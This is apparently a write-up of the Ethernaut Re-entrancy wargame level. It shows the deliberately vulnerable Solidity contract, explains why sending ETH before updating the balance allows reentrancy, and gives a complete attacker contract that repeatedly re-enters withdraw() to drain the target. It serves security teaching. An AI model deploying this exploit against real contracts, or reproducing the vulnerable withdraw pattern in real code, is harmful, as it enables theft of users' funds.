# Ethernaut Re-entrancy Level Attack

## Goal

Steal all the funds from the contract

--- 

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## Root cause

The problem here is the order in `withdraw()` function:
```solidity
(bool result, ) = msg.sender.call{value: _amount}("");
...
balances[msg.sender] -= _amount;
```

The contracts sends ETH to msg.sender before reducing `balances[msg.sender]`. So attacker contract can easily call `withdraw()` before balance is reduced.

## Attack contract 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public attackAmount;

    constructor(address payable _target) public {
        target = IReentrance(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        attackAmount = msg.value;

        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;

        if (targetBalance > 0) {
            uint256 amountToWithdraw = targetBalance >= attackAmount
                ? attackAmount
                : targetBalance;

            target.withdraw(amountToWithdraw);
        }
    }

    function collect() external {
        msg.sender.transfer(address(this).balance);
    }
}
```

## Attack plan

Step 1: Deploy the `ReentranceAttack` contract 

Step 2: Call `attack()` function with some ETH. The attack contracts first donates this ETH to itself, the calls `withdraw()`. When the vulnerable contract sends ETH back, the attack contract's `receive()` function is triggered and calls `withdraw()` again before its balance is reduced. This repeats until the vulnerable contract is drained. 

Step 3: After the attack finishes, check that the vulnerable contract balance is 0.